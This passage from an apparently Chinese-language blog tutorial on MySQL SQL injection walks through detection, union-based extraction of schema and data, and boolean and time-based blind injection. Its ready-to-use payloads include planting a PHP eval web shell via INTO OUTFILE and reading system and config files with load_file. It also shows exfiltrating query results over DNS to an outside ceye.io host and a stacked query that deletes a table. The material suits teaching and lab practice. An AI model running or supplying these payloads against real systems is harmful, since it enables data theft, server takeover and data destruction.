<p>这时候带入到原码中的内容就是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> = <span class="string">&#x27;1 LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
<p>通过对<code>$id</code>的构造，数据库能输出攻击者想要获取的内容，从而导致了数据库内容的泄露。</p>
<h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><p>在开始进行注入测试时，需要掌握数据库基本的语法，以及一些注入过程中常用的函数</p>
<h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><p>**system_user()**——系统用户名</p>
<p>**user()**——用户名</p>
<p>**current_user()**——当前用户名</p>
<p>**session_user()**——链接数据库的用户名</p>
<p>**database()**——数据库名</p>
<p>**version()**——数据库版本</p>
<p><strong>@@datadir</strong>——数据库路径</p>
<p><strong>@@basedir</strong>——数据库安装路径</p>
<p><strong>@@version_conpile_os</strong>——操作系统</p>
<h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><p>**concat(str1,str2,…)**——没有分隔符地连接字符串</p>
<p>**concat_ws(separator,str1,str2,…)**——含有分隔符地连接字符串</p>
<p>**group_concat(str1,str2,…)**——连接一个组的所有字符串，并以逗号分隔每一条数据。</p>
<h3 id="mysql注释符"><a href="#mysql注释符" class="headerlink" title="mysql注释符"></a>mysql注释符</h3><p>构造注入语句需要注释符来把查询语句后面的语句给屏蔽掉，mysql常用的注释符为：</p>
<ul>
<li><p><code>#</code></p>
</li>
<li><p><code>--</code></p>
</li>
</ul>
<h3 id="union-操作符的介绍"><a href="#union-操作符的介绍" class="headerlink" title="union 操作符的介绍"></a>union 操作符的介绍</h3><p>联合查询是可合并多个相似的选择查询的结果集。union 前后的两个 sql 语句的选择列数要相同才可以。U等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并。</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 语句 <span class="keyword">UNION</span>[<span class="keyword">union</span>选项] <span class="keyword">SELECT</span> 语句;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>union选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Distinct</td>
<td>去重，去掉完全重复的数据（默认的）</td>
</tr>
<tr>
<td>All</td>
<td>保存所有的结果</td>
</tr>
</tbody></table>
<h3 id="order-by介绍"><a href="#order-by介绍" class="headerlink" title="order by介绍"></a>order by介绍</h3><p>在mysql中order by是用来根据校对规则对数据进行排序</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">order by 字段 [asc|desc];     //asc升序，默认的</span><br></pre></td></tr></table></figure>
<p>并且order by还可以多字段排序，先按照第一个字段进行排序，然后再按照第二个字段进行排序。</p>
<p>因此在sql注入中可以通过order by来判断表中有多少字段，并且并不需要知道字段的名字是什么，通过数字1、2、3等也可以排序，因为在mysql中字段的名字也可以用过1、2、3等来表示。</p>
<h3 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h3><p>在注入脚本中经常需要字符串与数字之间的相互转换。</p>
<ul>
<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
<li><code>CHAR()</code>：把整数转换为对应的字符</li>
</ul>
<h3 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h3><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/4866277-47cd056f79a9f17e.png" alt="img"></p>
<p>mysql数据库中存在一个名为 <code>information_schema</code> 的基本库，里面存放了所有的库的基本信息，SQL注入的流程基本就是不断地构造语句查询<code>information_schema</code> 库中的信息。</p>
<h3 id="导入导出相关操作"><a href="#导入导出相关操作" class="headerlink" title="导入导出相关操作"></a>导入导出相关操作</h3><ul>
<li><strong>load_file()导出文件</strong></li>
</ul>
<p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串</p>
<p>使用条件： </p>
<ol>
<li>必须有权限读取并且文件必须完全可读 </li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0&#x2F;* 如果结果返回正常,说明具有读写权限。 </span><br><span class="line"></span><br><span class="line">and (select count(*) from mysql.user)&gt;0&#x2F;* 返回错误，应该是管理员给数据库帐户降权 </span><br></pre></td></tr></table></figure>
<ol start="2">
<li>欲读取文件必须在服务器上 </li>
<li>必须指定文件完整的路径</li>
<li>欲读取文件必须小于 max_allowed_packet</li>
</ol>
<p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的 就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有 administrators 才能访问的文件，users 就别想 load_file 出来。</p>
<p>在实际的注入中，我们有两个难点需要解决： </p>
<ol>
<li><p>绝对物理路径 </p>
</li>
<li><p>构造有效的畸形语句 （报错爆出绝对路径）</p>
</li>
</ol>
<p>在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors = on，程序就会暴露 WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务 器的安全将受到严重的威胁。</p>
<p>example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))</span><br><span class="line">利用 hex()将文件内容导出来，尤其是 smb 文件时可以使用</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:&#x2F;boot.ini”的 ASCII 代码</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,1,1,load_file(0x633a2f626f6f742e696e69)</span><br><span class="line">“c:&#x2F;boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,1,1,load_file(c:\\boot.ini)</span><br><span class="line">路径里的&#x2F;用 \\代替</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>文件导入到数据库</strong></li>
</ul>
<p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必 须为一个文字字符串。</p>
<p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据 库的权限时，可以将系统文件利用 load data infile 导入到数据库中。</p>
<p>example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">&#x27;/tmp/t0.txt&#x27;</span> <span class="keyword">ignore</span> <span class="keyword">into</span> <span class="keyword">table</span> t0 <span class="built_in">character</span> <span class="keyword">set</span> gbk <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span> <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>
<p>将/tmp/t0.txt 导入到 t0 表中，character set gbk 是字符集设置为 gbk，fields terminated by 是 每一项数据之间的分隔符，lines terminated by 是行的结尾符。</p>
<p>当错误代码是 2 的时候的时候，文件不存在，错误代码为 13 的时候是没有权限，可以考虑 /tmp 等文件夹。</p>
<ul>
<li><strong>导入到文件</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SELECT.....INTO OUTFILE &#x27;file_name&#x27;</span><br></pre></td></tr></table></figure>
<p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。</p>
<p>我们一般有两种利用形式:</p>
<ol>
<li>直接将 select 内容导入到文件中</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="keyword">version</span>() <span class="keyword">into</span> <span class="keyword">outfile</span> “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>
<p>此处将 version()替换成一句话，也即</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> &lt;?php @eval($_post[“mima”])?&gt; <span class="keyword">into</span> <span class="keyword">outfile</span> “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>
<p>直接连接一句话就可以了，其实在 select 内容中不仅仅是可以上传一句话的，也可以上传很 多的内容。</p>
<ol start="2">
<li>修改文件结尾</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="keyword">version</span>() <span class="keyword">Into</span> <span class="keyword">outfile</span> “c:\\phpnow\\htdocs\\test.php” <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x16</span> 进制文件</span><br></pre></td></tr></table></figure>
<p>解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用 FIELDS TERMINATED BY 16 进制可以为一句话或者其他任何的代码，可自行构造。</p>
<ul>
<li><strong>TIPS</strong></li>
</ul>
<ol>
<li>可能在文件路径当中要注意转义，这个要看具体的环境</li>
<li>上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语 句：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(‘c:\\wamp\\<span class="keyword">bin</span>\\mysql\\mysql5<span class="number">.6</span><span class="number">.17</span>\\my.ini’)<span class="keyword">into</span> <span class="keyword">outfile</span> ‘c:\\wamp\\www\\test.php’</span><br></pre></td></tr></table></figure>
<p>可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。 上述 my.ini 当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来， 这个要平时积累。</p>
<h3 id="增删改函数"><a href="#增删改函数" class="headerlink" title="增删改函数"></a>增删改函数</h3><p>在对数据进行处理上，我们经常用到的是增删查改。接下来我们讲解一下 mysql 的增删改。 查就是我们上述总用到的 select，这里就不介绍了。</p>
<ul>
<li><strong>增加 insert</strong></li>
</ul>
<p>增加一行数据，example：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span> (<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;lcamry&#x27;</span>,<span class="string">&#x27;lcamry&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>删除</strong><ul>
<li>删除数据<ul>
<li><strong>delete from 表名;</strong></li>
<li><strong>delete from 表名 where id=1;</strong></li>
</ul>
</li>
<li>删除结构<ul>
<li><strong>删数据库：drop database 数据库名;</strong></li>
<li><strong>删除表：drop table 表名;</strong></li>
<li><strong>删除表中的列：alter table 表名 drop column 列名;</strong></li>
</ul>
</li>
</ul>
</li>
<li><strong>修改</strong><ul>
<li><strong>修改所有：update 表名 set 列名=’新的值，非数字加单引号’</strong></li>
<li><strong>带条件的修改：updata 表名 set 列名=’新的值，非数字加单引号’ where id=6;</strong></li>
</ul>
</li>
</ul>
<p>example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> username=<span class="string">&#x27;tt&#x27;</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">15</span></span><br></pre></td></tr></table></figure>




<h2 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h2><p>寻找SQL注入漏洞有一种很简单的方法，就是通过发送特殊的数据来触发异常。</p>
<p>首先我们需要了解数据是通过什么方式进行输入，这里我总结了三个： GET请求：该请求在URL中发送参数。 POST请求：数据被包含在请求体中。 其他注入型数据：HTTP请求的其他内容也可能会触发SQL注入漏洞。</p>
<p>然后我们需要判断数据是什么类型，在mysql中，通常的2中数据类型是数字型和字符型。</p>
<p>字符型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and &#39;1&#39; &#x3D; &#39;1 --+		&#x2F;&#x2F;正常</span><br><span class="line">?id&#x3D;1&#39; and &#39;1&#39; &#x3D; &#39;2 --+		&#x2F;&#x2F;报错</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;1&quot; and &quot;1&quot; &#x3D; &quot;1 --+		&#x2F;&#x2F;正常</span><br><span class="line">?id&#x3D;1&quot; and &quot;1&quot; &#x3D; &quot;2 --+		&#x2F;&#x2F;报错</span><br></pre></td></tr></table></figure>
<p>数字型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1 &#x3D; 1 --+		&#x2F;&#x2F;正常</span><br><span class="line">?id&#x3D;1 and 1 &#x3D; 2 --+		&#x2F;&#x2F;报错</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;1 and 1 like 1 --+		&#x2F;&#x2F;正常</span><br><span class="line">?id&#x3D;1 and 1 like 2 --+		&#x2F;&#x2F;报错</span><br></pre></td></tr></table></figure>


<h2 id="回显注入-联合注入"><a href="#回显注入-联合注入" class="headerlink" title="回显注入(联合注入)"></a>回显注入(联合注入)</h2><p>回显的意思是，数据库会返回我们查询语句结果的具体内容，回显注入最基本的注入方式。</p>
<p>联合注入使用union，union 的作用是将两个 sql 语句进行联合。当 id 的数据在数据库中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）</p>
<h3 id="查询字段数目"><a href="#查询字段数目" class="headerlink" title="查询字段数目"></a>查询字段数目</h3><p>查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的二分法来进行判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1’ order by 1 –+ 此时页面正常，继续换更大的数字测试</span><br><span class="line">?id&#x3D;1’ order by 10 –+ 此时页面返回错误，更换小的数字测试</span><br><span class="line">?id&#x3D;1’ order by 5 –+ 此时页面依然报错，继续缩小数值测试</span><br><span class="line">?id&#x3D;1’ order by 3 –+ 此时页面返回正常，更换大的数字测试</span><br><span class="line">?id&#x3D;1’ order by 4 –+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3</span><br></pre></td></tr></table></figure>
<h3 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br></pre></td></tr></table></figure>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">或者</span><br><span class="line">id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;库名&#39; --+</span><br></pre></td></tr></table></figure>
<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;表名&#39; --+</span><br></pre></td></tr></table></figure>
<h3 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(字段名,字段名...) from 库名.表名 --+</span><br></pre></td></tr></table></figure>
<h3 id="获取WebShell"><a href="#获取WebShell" class="headerlink" title="获取WebShell"></a>获取WebShell</h3><p>利用SQL注入攻击获取WebShell其实就是在向服务器写文件。（注意：这里我们需要得到网站的绝对路径）所有常用的关系数据库管理系统（RDBMS）均包含内置的向服务器文件系统写文件的功能。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &quot;&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;&quot; INTO outfile &quot;绝对路径&quot;</span><br></pre></td></tr></table></figure>


<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>有时候会存在开发者将mysql的信息屏蔽，攻击者无法正常得到正常的mysql的回显，只回显正确或者错误两种提示。这个时候就需要用到盲注的技巧。</p>
<p>主要的盲注技巧有两种：布尔盲注以及时间盲注。</p>
<h4 id="Sql注入截取字符串常用函数"><a href="#Sql注入截取字符串常用函数" class="headerlink" title="Sql注入截取字符串常用函数"></a>Sql注入截取字符串常用函数</h4><p>在sql注入中，往往会用到截取字符串的问题，例如不回显的情况下进行的注入，也成为盲注，这种情况下往往需要一个一个字符的去猜解，过程中需要用到截取字符串。</p>
<ul>
<li><strong>mid(s,n,len)</strong></li>
</ul>
<p>从字符串 s 的 n 位置截取长度为 len 的子字符串</p>
<ul>
<li><strong>substr(s, start, length)/substring(s, start, length)</strong></li>
</ul>
<p>从字符串 s 的 start 位置截取长度为 length 的子字符串</p>
<ul>
<li><strong>left(s,n)</strong></li>
</ul>
<p>返回字符串 s 的前 n 个字符</p>
<ul>
<li><strong>ascii(s)/ord(s)</strong></li>
</ul>
<p>返回字符串 s 的第一个字符的 ASCII 码。这里不考虑多字节字符，比如汉字</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>ASCII码-10进制</th>
<th></th>
<th>字符</th>
<th>ASCII码-10进制</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>97</td>
<td>==&gt;</td>
<td>z</td>
<td>122</td>
</tr>
<tr>
<td>A</td>
<td>65</td>
<td>==&gt;</td>
<td>Z</td>
<td>90</td>
</tr>
<tr>
<td>0</td>
<td>48</td>
<td>==&gt;</td>
<td>9</td>
<td>57</td>
</tr>
<tr>
<td>_</td>
<td>95</td>
<td></td>
<td>@</td>
<td>64</td>
</tr>
</tbody></table>
<p>该表是常见字符的ascii码，可见范围是[48，122]</p>
<ul>
<li><strong>if(条件,为真结果,为假结果)</strong></li>
</ul>
<p>用在select查询当中，当做一种条件来进行判断</p>
<h4 id="REGEXP正则表达式"><a href="#REGEXP正则表达式" class="headerlink" title="REGEXP正则表达式"></a>REGEXP正则表达式</h4><p>下表中的正则模式可应用于 REGEXP 操作符中。</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>模式</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>匹配输入字符串的开始位置。</td>
</tr>
<tr>
<td>$</td>
<td>匹配输入字符串的结束位置。</td>
</tr>
<tr>
<td>.</td>
<td>匹配除 “\n” 之外的任何单个字符。</td>
</tr>
<tr>
<td>[…]</td>
<td>字符集合。匹配所包含的任意一个字符。</td>
</tr>
<tr>
<td>[^…]</td>
<td>负值字符集合。匹配未包含的任意字符。</td>
</tr>
<tr>
<td>p1|p2|p3</td>
<td>匹配 p1 或 p2 或 p3。</td>
</tr>
<tr>
<td>*</td>
<td>匹配前面的子表达式零次或多次。</td>
</tr>
<tr>
<td>+</td>
<td>匹配前面的子表达式一次或多次。</td>
</tr>
<tr>
<td>{n}</td>
<td>n 是一个非负整数。匹配确定的 n 次。</td>
</tr>
<tr>
<td>{n,m}</td>
<td>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td>
</tr>
</tbody></table>
<p>example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查找name字段中以&#x27;st&#x27;为开头的所有数据：</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> person_tbl <span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">&#x27;^st&#x27;</span>;</span><br><span class="line"></span><br><span class="line">查找name字段中以元音字符开头或以&#x27;ok&#x27;字符串结尾的所有数据：</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> person_tbl <span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">&#x27;^[aeiou]|ok$&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="LIKE-匹配"><a href="#LIKE-匹配" class="headerlink" title="LIKE 匹配"></a>LIKE 匹配</h4><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p>
<p>在 SQL 中，可使用以下通配符：</p>
<table>
<thead>
<tr>
<th>通配符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>%</td>
<td>替代 0 个或多个字符</td>
</tr>
<tr>
<td>_</td>
<td>替代一个字符</td>
</tr>
<tr>
<td>[charlist]</td>
<td>字符列中的任何单一字符</td>
</tr>
<tr>
<td>[^charlist]或[!charlist]</td>
<td>不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<p>example：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">选取 url 以字母 &quot;https&quot; 开始的所有网站：</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> <span class="keyword">url</span> <span class="keyword">LIKE</span> <span class="string">&#x27;https%&#x27;</span>;</span><br><span class="line"></span><br><span class="line">选取 name 以 &quot;G&quot; 开始，然后是一个任意字符，然后是 &quot;o&quot;，然后是一个任意字符，然后是 &quot;le&quot; 的所有网站：</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">&#x27;G_o_le&#x27;</span>;</span><br></pre></td></tr></table></figure>


<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注就是可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p>
<p>example：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; AND ASCII(SUBSTR(database(),1,1))&gt;88#	</span><br><span class="line">判断当前数据库名字的第一个字符的ascii码是否大于88</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 AND 1&#x3D;(IF((user() REGEXP &#39;^r&#39;),1,0))#</span><br><span class="line">正则匹配user表中的所有数据，是否存在以r开头的数据，有则返回1，无则返回0，再与前面的1&#x3D;相比较，如果是返回1则不会报错，否则报错</span><br></pre></td></tr></table></figure>
<h4 id="布尔盲注的流程"><a href="#布尔盲注的流程" class="headerlink" title="布尔盲注的流程"></a>布尔盲注的流程</h4><ol>
<li><strong>猜测数据库的名称</strong></li>
</ol>
<p>判断数据库名称的长度==》判断数据库名字</p>
<ol start="2">
<li><strong>猜测数据库的表名</strong></li>
</ol>
<p>猜测表的个数==》猜解表名的长度==》猜测表名</p>
<ol start="3">
<li><strong>猜解表中的字段名</strong></li>
</ol>
<p>猜解users表中字段个数==》猜解users表中字段的长度==》猜解users表中字段的名字</p>
<ol start="4">
<li><strong>猜解表中的字段值</strong></li>
</ol>
<p>猜解users表中有多少条数据==》猜解users表中字段值的长度==》猜解users表中字段值</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>时间的盲注就是通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用**sleep()**函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p>
<p>example：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果当前数据库名字的长度大于10的话，就沉睡5秒再输出，否则就就直接输出</span><br><span class="line">?id&#x3D;1&#39; AND IF(LENGTH(database())&gt;10,SLEEP(5),null)#</span><br></pre></td></tr></table></figure>


<p>还有一种是使用 **benchmark(count,expr)**函数，用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu 资源。推荐使用sleep()函数进行注入。</p>
<p>example：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="keyword">SUBSTRING</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">CHAR</span>(<span class="number">119</span>),<span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">ENCODE</span>(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),<span class="literal">null</span>) <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tb1;</span><br></pre></td></tr></table></figure>


<h3 id="DNSLog盲注"><a href="#DNSLog盲注" class="headerlink" title="DNSLog盲注"></a>DNSLog盲注</h3><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先<code>show variables like &#39;%secure%&#39;;</code>查看load_file()可以读取的磁盘。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%secure%&#x27;;</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">| require_secure_transport | OFF   |</span><br><span class="line">| secure_auth              | ON    |</span><br><span class="line">| secure_file_priv         | NULL  |</span><br><span class="line">+<span class="comment">--------------------------+-------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span>, <span class="number">1</span> <span class="keyword">warning</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>当secure_file_priv为空，就可以读取磁盘的目录。</p>
</li>
<li><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p>
</li>
<li><p>当secure_file_priv为null，load_file就不能加载文件。</p>
</li>
</ul>
<p>这里为NULL，因此需要在<code>my.ini</code>配置文件中修改权限，把配置文件中的这一行改为（没有就加上）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_file_priv&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p><strong>UNC路径</strong></p>
<p>以下是百度的UNC路径的解释</p>
<blockquote>
<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
</blockquote>
<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式<code>\\sss.xxx\test\</code></p>
<p>这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
<p><strong>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据</strong></p>
<p>payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">&#x27;\\\\&#x27;</span>,(查询语句),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>example:</p>
<p>在本地搭建了一个SQL注入的环境，在XP系统上似乎不行，原因未知，而在WIN10能够成功执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;db.php?id&#x3D;&#39; and (SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT database()),&#39;.t6n089.ceye.io\\abc&#39;)))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210317150746330.png" alt="image-20210317150746330"></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>Stacked injections(堆叠注入)指的是多条SQL注入语句一起使用，可以做到联合查询等无法做到的事情，例如删添改查其他数据表等等。</p>
<p>example：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</span><br><span class="line">?id&#x3D;1&#39;;EDLETE FROM products</span><br></pre></td></tr></table></figure>
<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
